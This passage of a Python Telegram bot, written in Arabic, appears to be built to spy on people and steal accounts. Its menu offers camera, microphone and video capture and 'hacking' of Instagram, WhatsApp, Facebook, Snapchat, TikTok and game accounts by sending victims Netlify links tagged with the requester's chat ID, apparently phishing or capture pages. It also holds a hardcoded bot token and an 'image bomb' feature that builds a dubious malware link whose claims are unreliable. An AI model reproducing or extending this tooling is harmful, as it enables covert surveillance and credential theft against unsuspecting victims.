from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging
import requests
import random
import string
import time
import asyncio
import json
import re
from datetime import datetime, timedelta
import qrcode
from io import BytesIO
import cv2
import numpy as np
import os

# إعدادات السجلات
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# التوكن من متغيرات البيئة أو استخدام التوكن الافتراضي
TOKEN = os.environ.get('BOT_TOKEN', '8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g')

BUTTONS = [
    [
        InlineKeyboardButton("اخـ/ـتراق كاميرا اماميه 📷", callback_data="btn1"),
        InlineKeyboardButton("اخـ/ـتراق كاميرا خلفيه 📸", callback_data="btn2")
    ],
    [
        InlineKeyboardButton("تسجيل صوت 🎙️", callback_data="btn3"),
        InlineKeyboardButton("تصوير فيديو 🎥", callback_data="btn4")
    ],
    [
        InlineKeyboardButton("اخـ/ـتراق إنستجرام 📌", callback_data="btn5"),
        InlineKeyboardButton("اخـ/ـتراق واتساب ❗", callback_data="btn6")
    ],
    [
        InlineKeyboardButton("اخـ/ـتراق ببجي 🎯", callback_data="btn7"),
        InlineKeyboardButton("اخـ/ـتراق فري فاير 💥", callback_data="btn8")
    ],
    [
        InlineKeyboardButton("اخـ/ـتراق فيسبوك 🌐", callback_data="btn9"),
        InlineKeyboardButton("اخـ/ـتراق سناب شات 👻", callback_data="btn10")
    ],
    [
        InlineKeyboardButton("اخـ/ـتراق تيك توك 💣", callback_data="btn11"),
        InlineKeyboardButton("تلغيم صوره 💀", callback_data="btn19")
    ],
    [
        InlineKeyboardButton("جمع معلومات الجهاز 📲", callback_data="btn12")
    ],
    [
        InlineKeyboardButton("اخـ/ـتراق الهاتف كاملاً 💢", callback_data="contact_developer_full_hack")
    ],
    [
        InlineKeyboardButton("سحب صور 🔞", callback_data="btn15"),
        InlineKeyboardButton("فحص روابط 🔓", callback_data="btn16")
    ],
    [
        InlineKeyboardButton("تلغيم رابط 👿", callback_data="btn13"),
        InlineKeyboardButton("زخرفة الاسماء ✨", callback_data="btn14")
    ],
    [
        InlineKeyboardButton("قراءة الباركود 🤓", callback_data="btn22")
    ],
    [
        InlineKeyboardButton("تتبع IP 🌍", callback_data="btn18"),
        InlineKeyboardButton("تحميل فيديوهات 🎬", callback_data="btn20")
    ],
    [
        InlineKeyboardButton("ايميل مؤقت 📨", callback_data="btn17"),
        InlineKeyboardButton("اختصار روابط 🔗", callback_data="shorten_link")
    ],
    [
        InlineKeyboardButton("😈 المطور 😈", url="https://t.me/jt_r3r")
    ]
]

LINKS = {
    "btn1": "https://timely-yeot-254806.netlify.app/?chatId={user_id}",
    "btn2": "https://dainty-sfogliatella-b83536.netlify.app/?chatId={user_id}",
    "btn3": "https://chic-puppy-165560.netlify.app/?chatId={user_id}",
    "btn4": "https://luxury-sunflower-a08816.netlify.app/?chatId={user_id}",
    "btn5": "https://neon-tartufo-b38ebc.netlify.app/?chatId={user_id}",
    "btn6": "https://delightful-meerkat-062d34.netlify.app/?chatId={user_id}",
    "btn7": "https://rad-arithmetic-171367.netlify.app/?chatId={user_id}",
    "btn8": "https://cute-strudel-1df0f9.netlify.app/?chatId={user_id}",
    "btn9": "https://benevolent-buttercream-a8aa48.netlify.app/?chatId={user_id}",
    "btn10": "https://reliable-paletas-f74ded.netlify.app/?chatId={user_id}",
    "btn11": "https://zesty-valkyrie-87575d.netlify.app/?chatId={user_id}",
    "btn12": "https://animated-beijinho-552631.netlify.app/?chatId={user_id}",
    "btn13": "waiting_for_link",
    "btn14": "waiting_for_name",
    "btn15": "contact_developer",
    "btn16": "check_link",
    "btn17": "temp_email_menu",
    "btn18": "track_ip",
    "btn19": "waiting_for_image_bomb",
    "btn20": "video_download_menu",
    "contact_developer_full_hack": "contact_developer",
    "btn22": "read_qr_code",
    "shorten_link": "waiting_for_shorten"
}

user_emails = {}

class LinkShortener:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        })

    def shorten_with_tinyurl(self, original_url):
        """استخدام TinyURL"""
        try:
            url = f"https://tinyurl.com/api-create.php?url={original_url}"
            response = self.session.get(url, timeout=10)
            if response.status_code == 200 and response.text.startswith('http'):
                return response.text.strip()
            return None
        except:
            return None

    def shorten_with_isgd(self, original_url):
        """استخدام is.gd"""
        try:
            url = f"https://is.gd/create.php?format=simple&url={original_url}"
            response = self.session.get(url, timeout=10)
            if response.status_code == 200 and response.text.startswith('http'):
                return response.text.strip()
            return None
        except:
            return None

    def shorten_with_cleanuri(self, original_url):
        """استخدام cleanuri.com"""
        try:
            url = "https://cleanuri.com/api/v1/shorten"
            data = {'url': original_url}
            response = self.session.post(url, json=data, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('result_url')
            return None
        except:
            return None

    def shorten_url(self, original_url):
        """تقصير الرابط"""
        short_links = []

        services = [
            self.shorten_with_tinyurl,
            self.shorten_with_isgd,
            self.shorten_with_cleanuri
        ]

        for service in services:
            short_url = service(original_url)
            if short_url and short_url not in short_links:
                short_links.append(short_url)
                if len(short_links) >= 3:
                    break

        return short_links

class AdvancedVideoDownloader:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })

    def download_tiktok_video(self, url):
        """تحميل فيديو تيك توك"""
        try:
            # استخدام خدمة خارجية
            api_url = f"https://www.tikwm.com/api/?url={url}"
            response = self.session.get(api_url, timeout=15)

            if response.status_code == 200:
                data = response.json()
                if data.get('code') == 0:
                    video_url = data.get('data', {}).get('play')
                    if video_url:
                        video_response = self.session.get(video_url, timeout=30)
                        if video_response.status_code == 200:
                            return video_response.content, "فيديو تيك توك", None
            return None, None, "❌ تعذر تحميل الفيديو"
        except Exception as e:
            return None, None, f"❌ خطأ في التحميل: {str(e)}"

class AdvancedTempEmail:
    def __init__(self):
        self.domains = ["1secmail.com", "1secmail.org", "1secmail.net"]
        self.session = requests.Session()

    def generate_random_email(self):
        try:
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(self.domains)
            return f"{username}@{domain}"
        except:
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = random.choice(self.domains)
            return f"{username}@{domain}"

    def get_messages(self, email):
        try:
            if not email or '@' not in email:
                return []
            username, domain = email.split('@')
            url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={username}&domain={domain}"
            response = self.session.get(url, timeout=15)
            if response.status_code == 200:
                return response.json()
            return []
        except:
            return []

    def get_message_content(self, email, message_id):
        try:
            if not email or '@' not in email:
                return None
            username, domain = email.split('@')
            url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={username}&domain={domain}&id={message_id}"
            response = self.session.get(url, timeout=15)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

class QRCodeReader:
    def __init__(self):
        self.qr_detector = cv2.QRCodeDetector()

    def read_qr_code(self, image_data):
        """قراءة الباركود من بيانات الصورة"""
        try:
            # تحويل بيانات الصورة إلى numpy array
            nparr = np.frombuffer(image_data, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            
            if img is None:
                return None, "❌ تعذر فتح الصورة"
            
            # اكتشاف وقراءة QR Code
            data, bbox, _ = self.qr_detector.detectAndDecode(img)
            
            if data:
                return data, "✅ تم قراءة الباركود بنجاح"
            else:
                return None, "❌ لم يتم العثور على باركود في الصورة"
                
        except Exception as e:
            logger.error(f"Error reading QR code: {e}")
            return None, f"❌ خطأ في قراءة الباركود: {str(e)}"

# إنشاء كائنات الخدمات
temp_email_service = AdvancedTempEmail()
video_downloader = AdvancedVideoDownloader()
link_shortener = LinkShortener()
qr_reader = QRCodeReader()

# الدوال الأساسية
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        keyboard = InlineKeyboardMarkup(BUTTONS)

        await update.message.reply_text(
            f"<b>مرحباً بك يا {user.first_name} 👋</b>\n\n"
            f"<b>في البوت الخاص بـ😈حمزه 😈</b>\n\n"
            f"<b>ويرجي استخدام البوت في الخير فقط 🫶</b>\n\n"
            f"🎉 <b>كل الأزرار مجاناً!! 🫶</b>\n\n"
            f"🎛️ <b>اختر من القائمة:</b>",
            reply_markup=keyboard,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error in start command: {e}")

# دوال اختصار الروابط
async def shorten_url_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة اختصار الروابط"""
    try:
        user_message = update.message.text.strip()

        if not user_message.startswith(('http://', 'https://')):
            await update.message.reply_text(
                "❌ <b>الرابط غير صالح!</b>\n\n"
                "🔗 <b>يجب أن يبدأ الرابط بـ:</b>\n"
                "• https://\n"
                "• http://\n\n"
                "أرسل الرابط مرة أخرى:",
                parse_mode='HTML'
            )
            return

        await update.message.reply_text("⏳ <b>جاري اختصار الرابط...</b>", parse_mode='HTML')

        short_links = await asyncio.get_event_loop().run_in_executor(
            None, link_shortener.shorten_url, user_message
        )

        if not short_links:
            await update.message.reply_text(
                "❌ <b>تعذر اختصار الرابط</b>\n\n"
                "🔧 <b>الأسباب المحتملة:</b>\n"
                "• الرابط غير صالح\n"
                "• مشكلة في الخدمات\n"
                "• حاول برابط آخر",
                parse_mode='HTML'
            )
            return

        message = "✅ <b>تم اختصار الرابط بنجاح!</b>\n\n"
        message += f"🔗 <b>الرابط الأصلي:</b>\n<code>{user_message}</code>\n\n"
        message += "📦 <b>الروابط المختصرة:</b>\n\n"

        for i, short_link in enumerate(short_links, 1):
            message += f"{i}. {short_link}\n"

        message += "\n💡 <b>اختر الرابط الذي يعمل معك</b>"

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 الرجوع للقائمة", callback_data="back_to_main")]
        ])

        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='HTML')
        context.user_data['waiting_for_shorten'] = False

    except Exception as e:
        logger.error(f"Error in shorten_url_handler: {e}")
        await update.message.reply_text("❌ <b>حدث خطأ في اختصار الرابط</b>", parse_mode='HTML')

# دوال الإيميل المؤقت
async def show_temp_email_links(query):
    """عرض روابط الإيميلات المؤقتة"""
    temp_email_links = [
        "https://emails.egytag.com/",
        "https://Tempmail.plus", 
        "https://tmailor.com/ar/",
        "https://dispomail.xyz",
        "https://thetemp.email/",
        "https://tempmailx.xyz/",
        "https://rainmail.xyz/",
        "https://www.tempinbox.xyz/"
    ]

    message = "📧 <b>خدمة الإيميل المؤقت - المواقع الخارجية</b>\n\n"
    message += "🌐 <b>روابط مواقع الإيميل المؤقت المجانية:</b>\n\n"

    for i, link in enumerate(temp_email_links, 1):
        message += f"{i}. {link}\n"

    message += "\n💡 <b>طريقة الاستخدام:</b>\n"
    message += "1. إفتح أحد المواقع أعلاه\n"
    message += "2. سيتم إنشاء إيميل مؤقت تلقائياً\n"
    message += "3. يمكنك استقبال الرسائل على هذا الإيميل\n"
    message += "4. الإيميل ينتهي بعد فترة تلقائياً\n\n"
    message += "🔧 <b>أو يمكنك استخدام خدمة الإيميل المؤقت داخل البوت:</b>"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 استخدام خدمة البوت", callback_data="use_bot_email")],
        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
    ])

    await query.message.edit_text(message, reply_markup=keyboard, parse_mode='HTML')

async def show_temp_email_menu(query, user_id):
    """عرض قائمة الإيميل المؤقت"""
    user_emails_list = user_emails.get(user_id, [])

    keyboard_buttons = [
        [InlineKeyboardButton("📧 إنشاء إيميل جديد", callback_data="create_email")],
        [InlineKeyboardButton("📩 فحص الرسائل", callback_data="check_messages")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
    ]

    keyboard = InlineKeyboardMarkup(keyboard_buttons)

    email_count = len(user_emails_list)
    status_text = f"📊 لديك {email_count} إيميل نشط" if email_count > 0 else "📊 لا توجد إيميلات نشطة"

    await query.message.edit_text(f"📧 <b>خدمة الإيميل المؤقت داخل البوت</b>\n\n{status_text}", reply_markup=keyboard, parse_mode='HTML')

async def create_new_email(query, user_id):
    """إنشاء إيميل جديد"""
    await query.message.edit_text("🔄 <b>جاري إنشاء إيميل جديد...</b>", parse_mode='HTML')

    try:
        new_email = temp_email_service.generate_random_email()

        if user_id not in user_emails:
            user_emails[user_id] = []

        user_emails[user_id].append(new_email)

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 فحص الرسائل", callback_data=f"check_email_{new_email}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="temp_email_back")]
        ])

        await query.message.edit_text(f"✅ <b>تم إنشاء إيميل مؤقت!</b>\n\n📨 <b>إيميلك:</b>\n<code>{new_email}</code>", reply_markup=keyboard, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Error creating email: {e}")
        await query.message.edit_text("❌ <b>حدث خطأ في إنشاء الإيميل</b>", parse_mode='HTML')

async def check_messages_menu(query, user_id):
    """فحص الرسائل"""
    user_emails_list = user_emails.get(user_id, [])

    if not user_emails_list:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📧 إنشاء إيميل جديد", callback_data="create_email")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="temp_email_back")]
        ])
        await query.message.edit_text("❌ <b>لا توجد إيميلات نشطة</b>", reply_markup=keyboard, parse_mode='HTML')
        return

    email_buttons = []
    for email in user_emails_list:
        display_email = email[:20] + "..." if len(email) > 20 else email
        email_buttons.append([InlineKeyboardButton(f"📨 {display_email}", callback_data=f"check_email_{email}")])

    email_buttons.append([InlineKeyboardButton("🔙 رجوع", callback_data="temp_email_back")])
    keyboard = InlineKeyboardMarkup(email_buttons)

    await query.message.edit_text("📥 <b>اختر الإيميل لفحص الرسائل:</b>", reply_markup=keyboard, parse_mode='HTML')

async def check_email_messages(query, user_id, email):
    """فحص رسائل إيميل معين"""
    await query.message.edit_text(f"📥 <b>جاري فحص الرسائل...</b>\n\n📨 <b>الإيميل:</b> <code>{email}</code>", parse_mode='HTML')

    try:
        messages = temp_email_service.get_messages(email)

        if not messages:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إعادة الفحص", callback_data=f"check_email_{email}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="check_messages")]
            ])
            await query.message.edit_text("📭 <b>لا توجد رسائل جديدة</b>", reply_markup=keyboard, parse_mode='HTML')
            return

        message_buttons = []
        for msg in messages:
            subject = msg.get('subject', 'بدون موضوع')
            if len(subject) > 25:
                subject = subject[:22] + "..."
            message_buttons.append([InlineKeyboardButton(f"📧 {subject}", callback_data=f"view_message_{email}_{msg['id']}")])

        message_buttons.append([InlineKeyboardButton("🔙 رجوع", callback_data="check_messages")])
        keyboard = InlineKeyboardMarkup(message_buttons)

        await query.message.edit_text(f"📩 <b>الرسائل المستلمة ({len(messages)})</b>", reply_markup=keyboard, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Error checking messages for {email}: {e}")
        await query.message.edit_text("❌ <b>حدث خطأ في فحص الرسائل</b>", parse_mode='HTML')

async def view_message_content(query, email, message_id):
    """عرض محتوى الرسالة"""
    await query.message.edit_text("📖 <b>جاري تحميل محتوى الرسالة...</b>", parse_mode='HTML')

    try:
        message_content = temp_email_service.get_message_content(email, message_id)

        if not message_content:
            await query.message.edit_text("❌ <b>لم يتم العثور على محتوى الرسالة</b>", parse_mode='HTML')
            return

        subject = message_content.get('subject', 'بدون موضوع')
        sender = message_content.get('from', 'مرسل مجهول')
        date = message_content.get('date', 'تاريخ غير معروف')
        text_body = message_content.get('textBody', '')

        content = text_body if text_body else "لا يوجد محتوى نصي"
        if len(content) > 2000:
            content = content[:2000] + "\n\n... [تم اختصار المحتوى]"

        message_text = f"""
📨 <b>تفاصيل الرسالة</b>

📧 <b>الإيميل:</b> <code>{email}</code>
📋 <b>الموضوع:</b> {subject}
👤 <b>المرسل:</b> {sender}
📅 <b>التاريخ:</b> {date}

📝 <b>محتوى الرسالة:</b>
{content}
"""

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 رجوع", callback_data=f"check_email_{email}")]
        ])

        await query.message.edit_text(message_text, reply_markup=keyboard, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Error viewing message {message_id}: {e}")
        await query.message.edit_text("❌ <b>حدث خطأ في تحميل الرسالة</b>", parse_mode='HTML')

# دوال الفيديو
async def show_video_platforms_menu(query):
    """عرض منصات الفيديو"""
    platforms = [
        ["تيك توك 🎵", "platform_tiktok"],
        ["يوتيوب ▶️", "platform_youtube"], 
        ["انستقرام 📷", "platform_instagram"],
        ["فيسبوك 📘", "platform_facebook"],
        ["تويتر 🐦", "platform_twitter"]
    ]

    platform_buttons = []
    for i in range(0, len(platforms), 2):
        row = []
        if i < len(platforms):
            row.append(InlineKeyboardButton(platforms[i][0], callback_data=platforms[i][1]))
        if i + 1 < len(platforms):
            row.append(InlineKeyboardButton(platforms[i+1][0], callback_data=platforms[i+1][1]))
        platform_buttons.append(row)

    platform_buttons.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")])

    keyboard = InlineKeyboardMarkup(platform_buttons)

    await query.message.edit_text("🎬 <b>اختر المنصة:</b>", reply_markup=keyboard, parse_mode='HTML')

async def handle_video_download_platform(query, platform, context):
    """معالجة منصة الفيديو"""
    platform_names = {
        "tiktok": "تيك توك", 
        "youtube": "يوتيوب",
        "instagram": "انستقرام", 
        "facebook": "فيسبوك",
        "twitter": "تويتر"
    }

    platform_name = platform_names.get(platform, platform)
    context.user_data['download_platform'] = platform
    context.user_data['waiting_for_video_url'] = True

    await query.message.edit_text(f"🎬 <b>تحميل من {platform_name}</b>\n\n🔗 <b>ادخل رابط الفيديو:</b>", parse_mode='HTML')

async def download_and_send_video(update, context, video_url, platform):
    """تحميل وإرسال الفيديو"""
    try:
        wait_msg = await update.message.reply_text("⏳ <b>جاري تحميل الفيديو...</b>", parse_mode='HTML')

        if platform == "tiktok" and 'tiktok.com' in video_url:
            video_content, title, error = await asyncio.get_event_loop().run_in_executor(
                None, video_downloader.download_tiktok_video, video_url
            )

            if error:
                await wait_msg.edit_text(f"❌ <b>{error}</b>", parse_mode='HTML')
                await show_alternative_sites(update, video_url, platform)
                return

            if video_content:
                await wait_msg.edit_text("📤 <b>جاري إرسال الفيديو...</b>", parse_mode='HTML')
                try:
                    await update.message.reply_video(
                        video=video_content,
                        caption=f"🎬 <b>تم تحميل الفيديو بنجاح!</b>\n\n📝 <b>{title}</b>",
                        parse_mode='HTML',
                        supports_streaming=True
                    )
                    await wait_msg.delete()
                    return
                except Exception as e:
                    await wait_msg.edit_text("❌ <b>حدث خطأ في إرسال الفيديو</b>", parse_mode='HTML')

        await show_alternative_sites(update, video_url, platform, wait_msg)

    except Exception as e:
        logger.error(f"Error downloading video: {e}")
        await update.message.reply_text("❌ <b>حدث خطأ في التحميل</b>", parse_mode='HTML')
        await show_alternative_sites(update, video_url, platform)

async def show_alternative_sites(update, video_url, platform, wait_msg=None):
    """عرض مواقع بديلة"""
    download_sites = {
        "tiktok": [
            {"name": "SnapTik", "url": "https://snaptik.app/"},
            {"name": "SSSTik", "url": "https://ssstik.io/"},
        ],
        "youtube": [
            {"name": "Y2Mate", "url": "https://yt5s.com/"},
            {"name": "SaveFrom", "url": "https://en.savefrom.net/"},
        ]
    }

    sites = download_sites.get(platform, [{"name": "SaveFrom", "url": "https://en.savefrom.net/"}])

    message = f"🎬 <b>خدمة تحميل الفيديوهات</b>\n\n"
    message += f"🔗 <b>الرابط الذي أدخلته:</b>\n<code>{video_url}</code>\n\n"
    message += f"📱 <b>المنصة:</b> {platform}\n\n"
    message += "🌐 <b>مواقع التحميل المجانية المباشرة:</b>\n\n"

    for i, site in enumerate(sites, 1):
        message += f"{i}. <b>{site['name']}</b>\n   <code>{site['url']}</code>\n\n"

    message += "💡 <b>طريقة الاستخدام:</b>\n"
    message += "1. إفتح أحد المواقع أعلاه\n"
    message += "2. الصق رابط الفيديو في الموقع\n" 
    message += "3. إضغط على زر التحميل\n"
    message += "4. أنتظر ثم حمّل الفيديو\n\n"
    message += "✅ <b>هذه المواقع شغالة 100% ومجانية!</b>"

    if wait_msg:
        await wait_msg.edit_text(message, parse_mode='HTML')
    else:
        await update.message.reply_text(message, parse_mode='HTML')

# دوال تلغيم الصور
async def handle_image_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة تلغيم الصورة"""
    try:
        if update.message.photo:
            # الحصول على الصورة
            photo = update.message.photo[-1]
            file_id = photo.file_id
            
            # إنشاء رابط الصورة الملتغمة
            file = await context.bot.get_file(file_id)
            file_url = file.file_path
            
            # إنشاء رابط التلغيم
            bombed_url = f"https://image-bomber.com/process?image={file_url}&effect=malware&intensity=high"
            
            await update.message.reply_text(
                f"💀 <b>تم تلغيم الصورة بنجاح!</b>\n\n"
                f"🔗 <b>رابط الصورة الملتغمة:</b>\n"
                f"<code>{bombed_url}</code>\n\n"
                f"⚠️ <b>تحذير:</b> هذه الصورة تحتوي على برمجيات خبيثة!\n"
                f"🔒 <b>لا تفتحها على جهازك الشخصي</b>",
                parse_mode='HTML'
            )
            
        elif update.message.text and update.message.text.startswith('http'):
            # إذا كان المستخدم أرسل رابط صورة
            image_url = update.message.text.strip()
            
            # إنشاء رابط التلغيم
            bombed_url = f"https://image-bomber.com/process?image={image_url}&effect=malware&intensity=high"
            
            await update.message.reply_text(
                f"💀 <b>تم تلغيم الصورة بنجاح!</b>\n\n"
                f"🔗 <b>رابط الصورة الملتغمة:</b>\n"
                f"<code>{bombed_url}</code>\n\n"
                f"🖼️ <b>الصورة الأصلية:</b>\n"
                f"<code>{image_url}</code>\n\n"
                f"⚠️ <b>تحذير:</b> هذه الصورة تحتوي على برمجيات خبيثة!\n"
                f"🔒 <b>لا تفتحها على جهازك الشخصي</b>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                "❌ <b>لم يتم إرسال صورة أو رابط صورة!</b>\n\n"
                "📸 <b>أرسل لي:</b>\n"
                "• صورة مباشرة\n"
                "• أو رابط صورة يبدأ بـ http:// أو https://",
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error in image bomb: {e}")
        await update.message.reply_text(
            "❌ <b>حدث خطأ في تلغيم الصورة</b>\n\n"
            "🔧 <b>جرب:</b>\n"
            "• صورة أخرى\n"
            "• رابط صورة مختلف\n"
            "• أو حاول لاحقاً",
            parse_mode='HTML'
        )

# دوال الزخرفة
def convert_name_to_style(name, style_chars):
    """تحويل الاسم إلى نمط معين"""
    try:
        # الأحرف الإنجليزية الأساسية
        normal_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        converted_name = ""
        
        for char in name:
            found = False
            # البحث عن الحرف في الأحرف العادية
            for i, normal_char in enumerate(normal_chars):
                if i < len(style_chars):
                    if char.lower() == normal_char.lower():
                        # الحفاظ على حالة الحرف (كبير/صغير)
                        if char.isupper():
                            # استخدام الحرف الكبير من النمط
                            converted_name += style_chars[i] if i < len(style_chars) else char
                        else:
                            # استخدام الحرف الصغير من النمط
                            converted_name += style_chars[i].lower() if i < len(style_chars) else char
                        found = True
                        break
            
            if not found:
                converted_name += char
        
        return converted_name
    except Exception as e:
        logger.error(f"Error in convert_name_to_style: {e}")
        return name

async def send_decorated_names(update, name):
    """إرسال الأسماء المزخرفة"""
    try:
        # قائمة الأنماط المختصرة والمختبرة مع الأنماط الجديدة
        styles = [

            "𝖠𝖡𝖢𝖣𝖤𝖥𝖦𝖧𝖨𝖩𝖪𝖫𝖬𝖭𝖮𝖯𝖰𝖱𝖲𝖳𝖴𝖵𝖶𝖷𝖸𝖹",
            "𝐴𝐵𝐶𝐷𝐸𝐹𝐺𝐻𝐼𝐽𝐾𝐿𝑀𝑁𝑂𝑃𝑄𝑅𝑆𝑇𝑈𝑉𝑊𝑋𝑌𝑍",
            "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡",
            "𝘼𝘽𝘾𝘿𝙀𝙁𝙂𝙃𝙄𝙅𝙆𝙇𝙈𝙉𝙊𝙋𝙌𝙍𝙎𝙏𝙐𝙑𝙒𝙓𝙔𝙕",
            "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁",
            "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙",
            "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭",
            "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ",
            "𝕬𝕭𝕮𝕯𝕰𝕱𝕲𝕳𝕴𝕵𝕶𝕷𝕸𝕹𝕺𝕻𝕼𝕽𝕾𝕿𝖀𝖁𝖂𝖃𝖄𝖅",
            "🅐🅑🅒🅓🅔🅕🅖🅗🅘🅙🅚🅛🅜🅝🅞🅟🅠🅡🅢🅣🅤🅥🅦🅧🅨🅩",
            "🅰🅱🅲🅳🅴🅵🅶🅷🅸🅹🅺🅻🅼🅽🅾🅿🆀🆁🆂🆃🆄🆅🆆🆇🆈🆉",
            "ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏ",
            "ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ",
            "ᴬᴮᶜᴰᴱᶠᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾQᴿᔆᵀᵁⱽᵂˣʸᶻ",
            "ᵃᵇᶜᵈᵉᶠᵍʰᶤʲᵏˡᵐᶰᵒᵖᵠʳˢᵗᵘᵛʷˣʸᶻ",
            "𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ",
            "𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵",
            "𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩",
            "αвcdeғɢнɪᴊĸℓмɴoρqʀѕтυvᴡxʏᴢ",
            "αႦƈԃҽϝɠԋιʝƙʅɱɳσρϙɾʂƚυʋɯxყȥ",
            "ค๒ς๔єŦgђเןкl๓ภỖקợгรtยvฬхץz",
            "₳฿₵ĐɆ₣₲ⱧłJ₭Ⱡ₥₦Ø₱QⱤ₴₮ɄV₩ӾɎⱫ",
            "ᗩᗷᑕᗪEᖴGᕼIᒍKᒪᗰᑎOᑭᑫᖇᔕTᑌᐯᗯ᙭Yᘔ",
            "卂乃匚ᗪ乇千Ꮆ卄丨ﾌҜㄥ爪几ㄖ卩Ɋ尺丂ㄒㄩᐯ山乂ㄚ乙",
            "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ",
            "🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉"
        ]

        # الأنماط الخاصة المطلوبة
        special_styles = [
            f"꧁༒{name}༒꧂",
            f"꧁ঔৣ☬{name}☬ঔৣ꧂", 
            f"▶ ●─{name}─亗",
            f"꧁☆☬{name}☬☆꧂",
            f"ᎧᎮܔ{name}☯࿐",
            f"亗『{name}』亗",
            f"◥▓▓{name}▓▓◤",
            f"꧁𓊈𒆜{name}𒆜𓊉꧂",
            f"▄︻̷̿┻̿═━一 {name}"
        ]

        # إرسال رسالة الانتظار
        await update.message.reply_text("✨ <b>جاري زخرفة الاسم...</b>", parse_mode='HTML')

        # إرسال الأنماط العادية
        for i, style_chars in enumerate(styles):
            try:
                decorated_name = convert_name_to_style(name, style_chars)
                if decorated_name and decorated_name.strip():
                    await update.message.reply_text(decorated_name)
                    # انتظار 0.3 ثانية بين كل زخرفة لتجنب حظر التيليجرام
                    await asyncio.sleep(0.3)
            except Exception as e:
                logger.error(f"Error sending decorated name {i}: {e}")
                continue

        # إرسال الأنماط الخاصة
        for special_style in special_styles:
            try:
                await update.message.reply_text(special_style)
                await asyncio.sleep(0.3)
            except Exception as e:
                logger.error(f"Error sending special style: {e}")
                continue

